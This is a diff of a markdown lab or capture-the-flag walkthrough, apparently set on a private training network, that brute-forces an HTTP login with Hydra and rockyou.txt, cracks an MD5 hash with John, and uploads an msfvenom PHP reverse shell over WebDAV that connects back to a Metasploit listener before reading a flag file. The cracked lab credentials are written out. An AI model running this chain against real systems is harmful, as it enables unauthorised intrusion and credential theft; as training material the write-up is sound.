@@ -60,10 +60,32 @@ Steps to set up:
   - ```gunzip rockyou.txt.gz```
   - ```ls```
     - to verify successful unzip
-  - ```hydra help``
+  - ```hydra help```
     - To see all avaliable flags
   - Ashton manages secret folder
     - Means username is ashton 
   - ``` hydra -l ashton -P rockyou.txt -s 80  -f -vV 192.168.1.105 http-get /company_folders/secret_folder ```
     - ```ashton:leopoldo```
-    - ![](/Img/hydra2.png)
+     ![](/Img/hydra2.png)
+- Open connect to corp server
+  - webdav
+  - log in with ryans account
+  - ryan password hash ``` d7dad0a5cd7c8376eeb50d69b3ccd352 ```
+  - ``` echo d7dad0a5cd7c8376eeb50d69b3ccd352 > hash.txt ```
+  - ```john hash.txt```
+  - ```john -show hash.txt ```
+    - ```ryan:linux4u```
+- Upload reverse php to webdav
+  - ```msfvenom -p php/reverse_php LHOST=192.168.1.90 LPORT=4445 -f raw > exploit.php```
+- Create Listener
+  - ```msf console```
+    - ```use exploit multi/handler```
+    - ``` set LHOST 192.168.1.90```
+    - ``` set LPORT 4445```
+    - ```set exploit php/reverse_php```
+    - ```exploit```
+- Open exploit.php in web to run on remote server
+- Meterpreter session
+  - ```cd /```
+  - ```ls```
+  - ```cat flag.txt```
